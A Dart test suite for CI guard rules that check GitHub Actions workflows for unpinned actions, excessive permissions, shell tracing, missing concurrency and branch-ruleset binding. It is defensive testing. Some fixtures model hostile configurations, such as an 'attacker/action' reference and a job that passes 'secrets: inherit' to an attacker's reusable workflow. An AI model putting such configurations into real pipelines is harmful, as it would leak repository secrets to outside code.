        ]) {
          expect(
            rule('x.yml', text),
            isNotEmpty,
            reason: 'unusable: "$why" scanned clean',
          );
        }
      });
    });

    test('an Error escaping the loader is an offender, not a crash', () {
      // The handler exists because StackOverflowError is an Error, not an
      // Exception, so `on YamlException` misses it and it escapes parse().
      //
      // The test that guarded it asserted nothing. It nested 6000 deep, and
      // I had measured that depth with `dart run` — `flutter test` has a
      // different stack size, so under the real runner 6000 raises a
      // YamlException and the test passed through the wrong branch.
      // Deleting the handler left the suite green (#191).
      //
      // Raising the depth is not the fix: it was lowered from 60000 because
      // that much stack pressure failed an unrelated file running
      // concurrently. So the handler is exercised directly instead, by
      // throwing the Error from inside the load.
      expect(
        () => Workflow.parse(
          'x.yml',
          'a: b\n',
          load: (_) => throw StackOverflowError(),
        ),
        returnsNormally,
        reason:
            'parse-error: a StackOverflowError from the loader escaped as a '
            'crash. It is an Error, not an Exception, so `on YamlException` '
            'does not catch it',
      );
      // The SAME method the guards call, with its loader replaced — not a
      // sibling that `parse` might or might not delegate to (#194).
      final wf = Workflow.parse(
        'x.yml',
        'a: b\n',
        load: (_) => throw StackOverflowError(),
      );
      expect(
        wf.problem,
        contains('too deep'),
        reason: 'parse-error: the offender must name what went wrong',
      );

      // And the real thing still behaves on a document the loader refuses.
      //
      // Said exactly, because the previous comment here claimed more than the
      // input delivers: this is an UNCLOSED sequence, and measured at 1000,
      // 3000, 6000, 12000 and 20000 it raises `YamlException: Expected node
      // content` at every depth. It never overflows — an unclosed sequence
      // fails in the scanner before recursion — so it exercises the refusal
      // path, not the `Error` path.
      //
      // Balanced brackets DO overflow, at a depth that differs between
      // machines — which is why asserting one from a FIXED depth is not
      // shippable, and why `every rule reports a document that overflows the
      // loader` searches for the depth in a worker isolate instead (#217).
      expect(
        Workflow.parse('x.yml', 'a:\n    ${'[' * 6000}').problem,
        isNotNull,
        reason:
            'parse-error: a document the loader refuses must come back as an '
            'offender rather than as an exception',
      );
    });

    test('a workflow that cannot be parsed is refused, not skipped', () {
      const broken = 'name: Broken\non: [push\njobs:\n  a:\n';
      for (final offenders in [
        secretsInRunOffenders('broken.yml', broken),
        untrustedInRunOffenders('broken.yml', broken),
        shellTraceOffenders('broken.yml', broken),
      ]) {
        expect(
          offenders,
          isNotEmpty,
          reason: 'unparseable: a guard that cannot read its subject must fail',
        );
      }
    });

    test('tracing is seen through quotes, paths and + flag groups', () {
      for (final script in const [
        'set -x',
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -v',
        'set -o xtrace',
        'set -o errexit -o xtrace',
        'set +e -x',
        'set +u -o xtrace',
        '"set -x; ./b.sh"',
        "'set -x'",
        '/bin/bash -x tools/gate.sh',
        '/usr/bin/bash -x x.sh',
        'bash --verbose x.sh',
        'bash -o xtrace x.sh',
        'exec bash -x x.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(script))),
          isNotEmpty,
          reason: 'trace: accepted `$script`',
        );
      }
      for (final script in const [
        'set -euo pipefail',
        'set -o pipefail',
        'settle -x',
        'set -- -x',
        'grep -v foo bar',
        'curl -sv https://example.invalid',
        'bash tools/gate.sh',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'trace-negative: refused `$script`',
        );
      }
    });

    test('a dependabot file missing an ecosystem is refused', () {
      const onlyActions =
          'version: 2\nupdates:\n  - package-ecosystem: github-actions\n';
      expect(dependabotOffenders(onlyActions).join(), contains('pub'));
      expect(dependabotOffenders(null).join(), contains('missing'));
    });

    test('a pin below the pubspec minimum is refused', () {
      expect(
        flutterPinOffenders(
          '{"flutter": "3.46.0"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ).join(),
        contains('below the minimum'),
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ),
        isEmpty,
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n',
        ).join(),
        contains('no `flutter:'),
      );
    });
    test('a uses: with no ref is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses: actions/checkout\n'),
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no @ref'));
    });
    test('a trailing @ with nothing after it is refused', () {
      expect(
        unpinnedUses('bad.yml', _workflow('      - uses: actions/checkout@\n')),
        hasLength(1),
      );
    });
    for (final ref in floatingRefs) {
      test('a ref of `$ref` is refused', () {
        final offenders = unpinnedUses(
          'bad.yml',
          _workflow('      - uses: actions/checkout@$ref\n'),
        );
        expect(offenders, hasLength(1));
        expect(offenders.single.message, contains('moving ref'));
      });
    }

    test('a ref that merely contains a floating word is allowed', () {
      // `v2-main-branch` is a real tag shape; only the whole ref counts.
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@v2-main-branch\n'),
        ),
        isEmpty,
      );
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@latest-stable\n'),
        ),
        isEmpty,
      );
    });

    test('an unpinned action written as a flow mapping is refused', () {
      // The line scan matched `^\s*-?\s*uses:`, so `- {uses: x}` returned
      // zero offenders — the exact bypass class #154 was filed for, still
      // open in this rule because it was never converted (#175).
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - {uses: attacker/action}\n'),
      );
      expect(
        offenders,
        hasLength(1),
        reason: 'flow-style `uses:` must be seen',
      );
      expect(offenders.single.message, contains('no @ref'));
    });

    test('an unpinned action whose value is on the next line is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses:\n          attacker/action\n'),
      );
      expect(offenders, hasLength(1));
    });

    test("a job's own uses: is subject to the pin rule", () {
      // WorkflowJob.uses was parsed and never consulted by this rule.
      final offenders = unpinnedUses(
        'bad.yml',
        'name: X\n'
            'on: workflow_dispatch\n'
            'permissions:\n  contents: read\n'
            'concurrency: x\n'
            'jobs:\n'
            '  a:\n'
            '    uses: attacker/wf/.github/workflows/x.yml\n'
            '    secrets: inherit\n',
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('job `a`'));
    });

    test('a folded or anchored uses: is not a false positive', () {
      // Both were flagged as missing a ref by the line scan, erring safe but
      // wrongly — the parser resolves them to their value (#175). The
      // anchored half was fixed and untested, in a test whose name claims
      // it (#196).
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: >-\n          actions/checkout@v7\n'),
        ),
        isEmpty,
        reason: 'folded',
      );
      expect(
        unpinnedUses(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &pin actions/checkout@v7\n'
              'jobs:\n  a:\n    steps:\n      - uses: *pin\n',
        ),
        isEmpty,
        reason: 'anchored: an alias resolves to its pinned value',
      );
      // And the complement, so the anchor case cannot pass by being unread.
      expect(
        unpinnedUses(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &bad attacker/action\n'
              'jobs:\n  a:\n    steps:\n      - uses: *bad\n',
        ),
        isNotEmpty,
        reason: 'anchored: an alias to an unpinned action must be refused',
      );
    });

    test('a pinned ref, a local action and a container are all allowed', () {
      const good =
          '      - uses: actions/checkout@v7\n'
          '      - uses: "subosito/flutter-action@v2"\n'
          "      - uses: 'ludeeus/action-shellcheck@2.0.0'\n"
          '      - uses: ./.github/workflows/ci.yml\n'
          '      - uses: docker://alpine:3.20\n'
          '      - uses: actions/checkout@v7  # trailing comment\n'
          '      # - uses: actions/checkout\n';
      expect(
        unpinnedUses('good.yml', _workflow(good)),
        isEmpty,
        reason: 'pins-negative: refused a legitimate uses: line',
      );
    });
    test('a workflow without top-level permissions is refused', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'jobs:\n  a:\n    permissions:\n      contents: read\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no top-level'));
    });
    test('write-all is refused at any level', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'permissions: read-all\n'
          'jobs:\n  a:\n    permissions: write-all\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('write-all is refused when quoted', () {
      // `permissions: 'write-all'` returned zero offenders: the line scan
      // matched the bare word only, and GitHub honours both (#175).
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          "permissions: 'write-all'\n"
          'jobs:\n  a:\n    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('read-all at the top level is allowed', () {
      expect(
        permissionOffenders(
          'good.yml',
          'name: X\non: push\nconcurrency: x\npermissions: read-all\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('a workflow without concurrency is refused', () {
      expect(
        concurrencyOffenders(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        hasLength(1),
      );
    });
    test('concurrency in either form is allowed', () {
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: play-release\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency:\n  group: ci\n  cancel-in-progress: true\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('no composite action exists that the rules cannot read', () {
      // The rules parse `jobs:` — a composite action's steps live under
      // `runs.steps`, so `.github/actions/**/action.yml` is scanned by
      // nothing: not for pins, not for secrets in run:, not for tracing.
      // None exist today, so this is a tripwire rather than a scan: adding
      // one fails here, and whoever adds it extends the rules first (#180).
      final dir = Directory('${repoRoot.path}/.github/actions');
      final found = dir.existsSync()
          ? dir
                .listSync(recursive: true)
                .whereType<File>()
                .where((f) => RegExp(r'action\.ya?ml$').hasMatch(f.path))
                .map((f) => f.path.replaceFirst('${repoRoot.path}/', ''))
                .toList()
          : <String>[];
      expect(
        found,
        isEmpty,
        reason:
            'composite actions are not covered by unpinnedUses, '
            'secretsInRunOffenders or shellTraceOffenders, which read '
            '`jobs:` and not `runs.steps`. Extend them before adding $found',
      );
    });

    test('only release.yml may upload to Play', () {
      // The rule applied to every workflow, not only the one it was written
      // for. ci.yml is `workflow_call`ed by release.yml with
      // `secrets: inherit`, so an upload step added there runs with
      // PLAY_SERVICE_ACCOUNT_JSON on a tag push (#182).
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        if (path.endsWith('release.yml')) {
          expect(_playUploads(wf), [
            'ship.play',
          ], reason: 'upload-scope: release.yml must upload once, from ship');
        } else {
          _expectNoPlayUpload(wf);
        }
        _assertRunnerAndEnvironment(wf);
      }
    });

    test('an offender names its line in every scalar style', () {
      // #188 fixed the block style and broke the single-line one, because
      // `bodyLine = line + 1` was unconditional and the issue's premise
      // ("every block-scalar run: … and that is all of them") was false.
      // Nine single-line `run:` values live in these workflows. All four
      // styles are asserted now, so neither direction can drift (#188, #195).
      const head =
          'name: X\n' // 1
          'on: push\n' // 2
          'permissions:\n' // 3
          '  contents: read\n' // 4
          'concurrency: x\n' // 5
          'jobs:\n' // 6
          '  a:\n' // 7
          '    steps:\n'; // 8
      final cases = <String, ({String yaml, int line})>{
        'block scalar': (
          yaml: '$head      - run: |\n          echo one\n          set -x\n',
          line: 11,
        ),
        'folded scalar': (
          yaml: '$head      - run: >-\n          set -x\n',
          line: 10,
        ),
        'plain single line': (yaml: '$head      - run: set -x\n', line: 9),
        'quoted single line': (yaml: '$head      - run: "set -x"\n', line: 9),
      };
      cases.forEach((style, c) {
        final offenders = shellTraceOffenders('x.yml', c.yaml);
        expect(offenders, hasLength(1), reason: 'offender-line: $style');
        expect(
          offenders.single.line,
          c.line,
          reason:
              'offender-line: $style — the offence is on line ${c.line} and '
              'the offender says ${offenders.single.line}',
        );
      });
    });

    test('a job that is not a mapping is refused, not skipped', () {
      // `if (jobMap is! YamlMap) continue;` dropped it silently with
      // problem == null, so all three rules returned zero offenders for a
      // file holding one — #177's class in one more spelling (#188).
      const doc =
          'name: X\non: push\npermissions:\n  contents: read\n'
          'concurrency: x\n'
          'jobs:\n'
          '  a: nope\n'
          '  b:\n    steps:\n      - run: echo hi\n';
      final wf = Workflow.parse('x.yml', doc);
      expect(wf.problem, isNotNull, reason: 'a scalar job scanned as clean');
      expect(wf.problem, contains('not mappings'));
      for (final rule in <List<WorkflowOffender> Function(String, String)>[
        unpinnedUses,
        permissionOffenders,
        concurrencyOffenders,
      ]) {
        expect(rule('x.yml', doc), isNotEmpty);
      }
    });

    test('write-all is refused whatever its case', () {
      // Compared case-sensitively where the rest of this file is
      // deliberately case-insensitive (#188).
      for (final spelling in const [
        'write-all',
        'WRITE-ALL',
        'Write-All',
        "'write-all'",
      ]) {
        final doc =
            'name: X\non: push\nconcurrency: x\n'
            'permissions: $spelling\n'
            "jobs:\n  a:\n    steps:\n      - run: 'true'\n";
        expect(
          permissionOffenders('x.yml', doc),
          isNotEmpty,
          reason: 'write-all-case: `$spelling` was accepted',
        );
      }
    });

    test('a rate-limited read is told apart from a real refusal', () {
      // The recorded shape of GitHub's answer when an anonymous caller has
      // spent its 60 requests. Kept as a fixture so the branch that skips on
      // it is exercised without waiting an hour for a real one (#219).
      const rateLimited =
          '{"message":"API rate limit exceeded for 1.2.3.4. (But here is the '
          'good news: Authenticated requests get a higher rate limit.)",'
          '"documentation_url":"https://docs.github.com/rest"}';
      expect(_isRateLimited('403', rateLimited), isTrue);

      // And the complement: a 403 that is NOT rate limiting must not be
      // waved through as a skip, or a genuinely refused read reads as
      // "nothing to see here".
      expect(
        _isRateLimited('403', '{"message":"Resource not accessible"}'),
        isFalse,
        reason: 'a permissions 403 is a failure, not a skip',
      );
      expect(_isRateLimited('200', rateLimited), isFalse);
      expect(_isRateLimited('404', rateLimited), isFalse);
      // GitHub uses 429 for secondary limits; a 429 that is not rate
      // limiting is still a failure.
      expect(_isRateLimited('429', rateLimited), isTrue);
      expect(
        _isRateLimited('429', '{"message":"Service unavailable"}'),
        isFalse,
      );
    });

    test('the required checks are still bound, and are the check-run names', () {
      // The one part of the merge gate with no guard on it: the ruleset
      // lives in GitHub config, so #187 is real today and silently
      // reversible tomorrow — the same failure mode as the issue itself, a
      // gate that exists but does not bind (#196).
      //
      // Read WITHOUT authentication. The previous version used `gh` and
      // said in three places that this needs an admin-scoped token CI does
      // not have. That was simply untrue: this repository is public, and
      // the rulesets endpoint answers 200 to an anonymous request with the
      // enforcement state, the branch condition and both required checks.
      // Only `bypass_actors` is redacted. So the check runs everywhere,
      // including CI, and the reason it did not was that `ci.yml` passes no
      // token at all (#202).
      const rulesetUrl =
          'https://api.github.com/repos/honestarcade/HonestSudoku/rulesets/23682733';
      // Authenticated WHEN A TOKEN IS AVAILABLE, anonymous otherwise.
      //
      // The anonymous limit is 60 requests per hour per IP, and the battery
      // runs this suite once per mutation — 88 calls from one address. That
      // was filed as a latent risk and then happened, locally, inside this
      // session: `ruleset: unexpected HTTP 403`. A token raises the limit to
      // 5000/hr, and `github.token` is available to every CI job (#219).
      //
      // The anonymous path stays as the fallback, because it is what makes
      // this guard work for a contributor with no token at all.
      final token =
          Platform.environment['GITHUB_TOKEN'] ??
          Platform.environment['GH_TOKEN'] ??
          '';
      late final ProcessResult probe;
      try {
        probe = Process.runSync(
          'curl',
          [
            '-sS',
            '--max-time',
            '20',
            '-w',
            '\n%{http_code}',
            '-H',
            'Accept: application/vnd.github+json',
            if (token.isNotEmpty) ...['-H', 'Authorization: Bearer $token'],
            rulesetUrl,
          ],
          stdoutEncoding: utf8,
          stderrEncoding: utf8,
        );
      } on ProcessException {
        // `Process.runSync` THROWS when the binary is absent; it does not
        // return a non-zero code. The old skip branch could therefore only
        // ever mean "unauthenticated", and a developer without the tool got
        // the red suite its comment promised they would not (#202).
        markTestSkipped('curl is not installed');
        return;
      }

      final lines = probe.stdout.toString().trim().split('\n');
      final status = lines.isEmpty ? '' : lines.last.trim();
      final payload = lines.take(lines.length - 1).join('\n');

      if (probe.exitCode != 0) {
        markTestSkipped('no network: ${probe.stderr}');
        return;
      }
      if (_isRateLimited(status, payload)) {
        // Rate limiting says nothing about the ruleset, so it must not be
        // reported as though the gate were unguarded. Skipping is honest;
        // failing here would be the same false red the ProcessException
        // branch was written to avoid (#219).
        markTestSkipped(
          'GitHub rate-limited this read. Set GITHUB_TOKEN to raise the '
          'limit from 60/hr to 5000/hr.',
        );
        return;
      }
      if (status == '404') {
        // Pointing this test at a nonexistent id printed `All tests
        // passed!`, so DELETING the ruleset — the single most likely way to
        // undo #187 — was invisible to the guard built to detect it (#202).
        fail(
          'ruleset: the ruleset at $rulesetUrl does not exist. The `main` '
          'branch has no protection, so nothing requires `gate` or '
          '`mutations` before a merge',
        );
      }
      if (status == '401') {
        fail(
          'ruleset: GitHub rejected the token (HTTP 401). In CI that is '
          'HS_RULESET_READ_TOKEN lapsed or revoked — rotate it (#228)',
        );
      }
      expect(
        status,
        '200',
        reason: 'ruleset: unexpected HTTP $status reading the ruleset',
      );

      final doc = jsonDecode(payload) as Map<String, dynamic>;

      // WHOLE TOKENS, not substrings. `contains('active')` is satisfied by
      // the substring inside `inactive`, so a ruleset switched to
      // `enforcement: disabled` passed; and `contains('gate:15368')` is
      // satisfied by `CI / gate:15368`, which is the PR UI's rendering and
      // exactly the #137 failure this test's own message warns about. Both
      // were green at round eight (#202).
      expect(
        doc['enforcement'],
        'active',
        reason:
            'ruleset: the main branch ruleset is `${doc['enforcement']}`, '
            'not active — nothing it says is enforced',
      );

      // `target` decides what `~DEFAULT_BRANCH` even means. Flipped to `tag`,
      // every other assertion here still passes while `main` is completely
      // unguarded — which is a gate that exists and does not bind, the exact
      // shape of #187 (#219).
      expect(
        doc['target'],
        'branch',
        reason:
            'ruleset: the ruleset targets `${doc['target']}`, not branches, '
            'so its branch condition guards nothing',
      );

      final ruleTypes = [
        for (final rule in (doc['rules'] as List? ?? const []))
          (rule as Map)['type'],
      ];
      expect(
        ruleTypes,
        contains('pull_request'),
        reason:
            'ruleset: no `pull_request` rule, so a push straight to `main` '
            'never meets a check at all. Required checks apply to pull '
            'requests; without this rule they are unreachable',
      );

      final refs =
          ((doc['conditions'] as Map<String, dynamic>?)?['ref_name']
                  as Map<String, dynamic>?)?['include']
              as List? ??
          const <String>[];
      expect(
        refs.cast<String>(),
        contains('~DEFAULT_BRANCH'),
        reason:
            'ruleset: the ruleset does not apply to the default branch, so '
            'it can be active and still not guard `main`',
      );

      final required = <String>[
        for (final rule in (doc['rules'] as List? ?? const []))
          if ((rule as Map)['type'] == 'required_status_checks')
            for (final check
                in ((rule['parameters'] as Map)['required_status_checks']
                    as List))
              '${(check as Map)['context']}:${check['integration_id']}',
      ];
      for (final check in const ['gate', 'mutations']) {
        expect(
          required,
          contains('$check:15368'),
          reason:
              'ruleset: `$check` is not a required status check pinned to '
              'GitHub Actions. Required now: $required. The context is the '
              "CHECK-RUN NAME, not the PR UI's rendering (`CI / $check`) — "
              '#137 learned that twice',
        );
      }

      // `bypass_actors` is redacted from every read that lacks repository
      // Administration — including an authenticated one — and GITHUB_TOKEN
      // CANNOT be granted it: `administration` is not a permission key the
      // workflow syntax accepts. The tenth pass added it to ci.yml on the
      // strength of a comment saying it would work, the workflow failed
      // validation, zero jobs ran, and the required-check binding refused
      // the merge (#228).
      //
      // So in CI this field is unreadable by `github.token` BY CONSTRUCTION.
      // The owner's decision (#228, 2026-09-22): a fine-grained PAT with
      // repository Administration read-only, stored as
      // `HS_RULESET_READ_TOKEN`, which `ci.yml` hands to every guard run
      // in place of `github.token` — and, because a secret can lapse,
      // `HS_RULESET_READ_EXPECTED=1` beside it, so that an absent field
      // with the token present is red rather than a skip. `_bypassVerdict`
      // holds that logic and has its own test, because this branch can only
      // be reached for real in CI.
      //
      // Without the token — a maintainer's shell — the skip stands, and the
      // runner counts and prints it: `~1` from the compact reporter, and
      // `⏭️` with `N passed, 1 skipped` from the one CI selects on GitHub
      // Actions. Reported, not silent:
      // `printOnFailure` was used for that once and emits only when the
      // test FAILS.
      final verdict = _bypassVerdict(
        doc['bypass_actors'],
        Platform.environment,
      );
      if (verdict.skip) {
        markTestSkipped(
          'bypass_actors is unreadable without repository administration, '
          'which this token does not hold. The enforcement, target, branch '
          'condition, pull_request rule and required checks were verified; '
          'the bypass list was not. CI reads it with HS_RULESET_READ_TOKEN '
          '(#228)',
        );
        return;
      }
      expect(
        verdict.problem,
        isNull,
        reason: verdict.problem ?? 'ruleset: bypass list acceptable',
      );
    });

    test(
      'the bypass verdict is decided the same with or without the token',
      () {
        // Recorded shapes, not a network read — the branch a token with
        // Administration reaches is otherwise untestable on any machine
        // without one, which is every local run and the battery (#228).
        const unset = <String, String>{};
        const set = {'HS_RULESET_READ_EXPECTED': '1'};
        expect(
          _bypassVerdict(null, unset).skip,
          isTrue,
          reason:
              'bypass-verdict: without a token that can read the field, an '
              'absent field is a skip, and it must stay one — a maintainer '
              'without an admin token must not see a red suite for it',
        );
        // The key and its value are asserted, not only the branch. `''` is
        // what ci.yml writes when the secret is absent — that expression
        // yields `'1'` or `''` and can produce nothing else — and reading it
        // as "the token can see the field" would turn every fork's PR red
        // for a field nobody there can read. `'0'` and a neighbouring key
        // are values the comparison must also refuse; they are not things
        // ci.yml writes, which is what this comment said (#246).
        for (final other in const [
          {'HS_RULESET_READ_EXPECTED': ''},
          {'HS_RULESET_READ_EXPECTED': '0'},
          {'HS_RULESET_READ_TOKEN': '1'},
        ]) {
          expect(
            _bypassVerdict(null, other).skip,
            isTrue,
            reason:
                'bypass-verdict: $other was read as "the token can see the '
                'field", so a fork PR — where ci.yml writes exactly this — '
                'would go red for a field nobody can read',
          );
        }

        final lapsed = _bypassVerdict(null, set);
        expect(
          lapsed.skip,
          isFalse,
          reason:
              'bypass-verdict: the field is absent although the token was '
              'expected to read it, and the guard SKIPPED. A lapsed '
              'HS_RULESET_READ_TOKEN would degrade this control silently',
        );
        expect(
          lapsed.problem,
          contains('lapsed'),
          reason: 'bypass-verdict: the failure does not say what to rotate',
        );
        expect(
          _bypassVerdict(<dynamic>[], set).problem,
          isNull,
          reason:
              'bypass-verdict: an empty bypass list is the state this guard '
              'exists to confirm, and it was reported as a problem',
        );
        final actor = _bypassVerdict([
          {
            'actor_id': 5,
            'actor_type': 'RepositoryRole',
            'bypass_mode': 'always',
          },
        ], set);
        expect(
          actor.problem,
          isNotNull,
          reason:
              'bypass-verdict: a bypass actor was accepted. That actor can '
              'push to `main` past both required checks',
        );
        expect(
          actor.skip,
          isFalse,
          reason: 'bypass-verdict: a bypass actor was skipped over',
        );
      },
    );

    test(
      'every step that runs the guard suite is handed the ruleset token',
      () {
        // #240. `_bypassVerdict` decides correctly and the ruleset test reads
        // the flag, and neither of those says ci.yml still SETS them:
        // deleting `HS_RULESET_READ_EXPECTED` from the `gate` step left the
        // suite green, and what it costs — CI back to skipping the bypass
        // check on a lapsed token — is invisible until the day it matters.
        //
        // Which env a step declares is a property of the DOCUMENT, so it is
        // read as one, through `Workflow.parse` (#205). Closed against the
        // files in both directions: a step that runs the suite must carry
        // both keys, and a fourth such step must be written down here.
        const runsTheSuite = [
          'flutter test',
          'tools/gate.sh',
          'tools/mutation_check.py',
        ];
        const expected = [
          '.github/workflows/ci.yml gate guards',
          '.github/workflows/ci.yml gate gate',
          '.github/workflows/ci.yml mutations mutations',
        ];

        final found = <String>{};
        for (final path in _workflowFiles()) {
          final wf = Workflow.parse(path, readFile(path));
          expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
          for (final job in wf.jobs) {
            for (final step in job.steps) {
              final body = step.run;
              if (body == null) continue;
              if (!runsTheSuite.any(body.contains)) continue;
              found.add('$path ${job.name} ${step.id}');
              for (final key in const [
                'GITHUB_TOKEN',
                'HS_RULESET_READ_EXPECTED',
              ]) {
                expect(
                  step.env[key],
                  contains('secrets.HS_RULESET_READ_TOKEN'),
                  reason:
                      'ruleset-token: $path job `${job.name}` step '
                      '`${step.id}` runs the guard suite without `$key` from '
                      '`HS_RULESET_READ_TOKEN`. Without the token the ruleset '
                      'guard cannot read `bypass_actors`; without the flag it '
                      'SKIPS instead of failing when the token has lapsed, '
                      'which is the silent downgrade #228 exists to prevent',
                );
              }
            }
          }
        }
        expect(
          found,
          unorderedEquals(expected),
          reason:
              'ruleset-token: the steps that run the guard suite are not the '
              'ones named here. A new one is unguarded until it is added; a '
              'missing one means the suite stopped running where it did',
        );
      },
    );

    test(
      'the flag the workflow sets is the flag the guard reads',
      () {
        // The last unexercised wiring of #228, and #240 recorded it as
        // untestable in-process, which it is: a test cannot set its own
        // process environment, so hard-coding the argument at the call site
        // was green. A CHILD can. This runs the ruleset test with the flag
        // set and both tokens stripped, where an absent `bypass_actors` must
        // be a FAILURE — with the argument hard-coded it becomes a skip,
        // which is the silent downgrade #228 exists to prevent (#245).
        //
        // `slow`, and the first test to carry that tag. Measured on
        // 2026-09-22 (`flutter test --no-pub --plain-name 'the flag the
        // workflow sets'`): about 2s, because the child reuses the build the
        // parent just made. The tag is for the multiplier rather than for
        // that number — the battery would otherwise spawn one more full test
        // process per mutation, and there are over a hundred.
        final env = Map<String, String>.from(Platform.environment)
          ..remove('GITHUB_TOKEN')
          ..remove('GH_TOKEN')
          ..['HS_RULESET_READ_EXPECTED'] = '1';
        final child = Process.runSync(
          'flutter',
          [
            'test',
            '--no-pub',
            '--plain-name',
            'the required checks are still bound',
            'test/guards/workflow_guard_test.dart',
          ],
          environment: env,
          includeParentEnvironment: false,
        );
        final out = '${child.stdout}${child.stderr}';

        // The three conditions under which the read cannot happen at all are
        // the parent's own skips, and an anonymous read from a shared runner
        // address can meet the third. A skip here says so out loud rather
        // than passing for a reason that has nothing to do with the wiring.
        for (final why in const [
          'no network',
          'curl is not installed',
          'rate-limited',
        ]) {
          if (out.contains(why)) {
            // Worded to contain no marker: `'ruleset:'` is one, and a
            // skip message is printed, so this sentence would have made
            // three #202 entries vacuous in every run where the child was
            // rate-limited (#244).
            markTestSkipped(
              'the child could not reach the rulesets API ($why)',
            );
            return;
          }
        }

        expect(
          child.exitCode,
          isNot(0),
          reason:
              'flag-wiring: with HS_RULESET_READ_EXPECTED=1 and no token, an '
              'absent `bypass_actors` must fail. The child passed, so the '
              'flag never reached the verdict — the guard is back to '
              'skipping on a lapsed token. Child output:\n$out',
        );
        expect(
          out,
          contains('Rotate it (#228)'),
          reason:
              'flag-wiring: the child failed for some other reason than the '
              'lapsed-token check. Child output:\n$out',
        );
      },
      tags: ['slow'],
      timeout: const Timeout(Duration(minutes: 5)),
    );

    test('every workflow pins its concurrency and its permissions', () {
      // #261. `concurrencyOffenders` asks whether a `concurrency:` key
      // exists — in either form — and `permissionOffenders` asks whether a
      // `permissions:` block exists and is not `write-all`. Neither reads a
      // VALUE, so all of these were green: a release that cancels in
      // progress, a pull request that stops cancelling, and the gate job
      // taking `contents: write` + `actions: write` + `packages: write`
      // while being `workflow_call`ed with `secrets: inherit`.
      //
      // Values, by equality, closed against the files. The map is the
      // decision; changing one means changing it here, which is the point.
      const expected =
          <String, ({String group, String cancel, Map<String, String> perms})>{
            '.github/workflows/ci.yml': (
              group: r'ci-${{ github.ref }}',
              // A tag never cancels: release.yml calls this file, so its own
              // `cancel-in-progress: false` does not cover the gate that does
              // the work.
              cancel: r"${{ !startsWith(github.ref, 'refs/tags/') }}",
              perms: {'contents': 'read'},
            ),
            '.github/workflows/release.yml': (
              group: 'play-release',
              cancel: 'false',
              perms: {'contents': 'read'},
            ),
            '.github/workflows/play-promote.yml': (
              group: 'play-promote',
              cancel: 'false',
              perms: {'contents': 'read'},
            ),
            '.github/workflows/play-api-check.yml': (
              group: 'play-api-check',
              cancel: 'false',
              perms: {'contents': 'read'},
            ),
          };

      // The one job that needs more than the workflow's own grant, named
      // with the reason it needs it. Anything else is a finding.
      const jobPermissions = <String, Map<String, String>>{
        '.github/workflows/release.yml ship': {'contents': 'write'},
      };

      expect(
        expected.keys.toSet(),
        unorderedEquals(_workflowFiles()),
        reason:
            'concurrency-values: a workflow file is not pinned here. A new '
            'one inherits no decision about cancellation or privilege until '
            'it is written down',
      );

      expected.forEach((path, want) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        expect(
          wf.concurrencyGroup,
          want.group,
          reason:
              'concurrency-values: $path groups on '
              '`${wf.concurrencyGroup}`, not `${want.group}`',
        );
        expect(
          wf.concurrencyCancelInProgress,
          want.cancel,
          reason:
              'concurrency-values: $path has cancel-in-progress '
              '`${wf.concurrencyCancelInProgress}`, not `${want.cancel}`. A '
              'release that cancels loses the build it was asked to make; a '
              'pull request that does not cancel burns runners on superseded '
              'commits. #252 is what the first one costs',
        );
        expect(
          wf.permissions,
          want.perms,
          reason:
              'permission-values: $path grants ${wf.permissions}, not '
              '${want.perms}. Every one of these files is reachable with the '
              'repository\'s secrets in scope',
        );

        for (final job in wf.jobs) {
          final key = '$path ${job.name}';
          final allowed = jobPermissions[key] ?? const <String, String>{};
          expect(
            job.permissions,
            allowed,
            reason:
                'permission-values: job `${job.name}` of $path grants '
                '${job.permissions}. A job-level block replaces the '
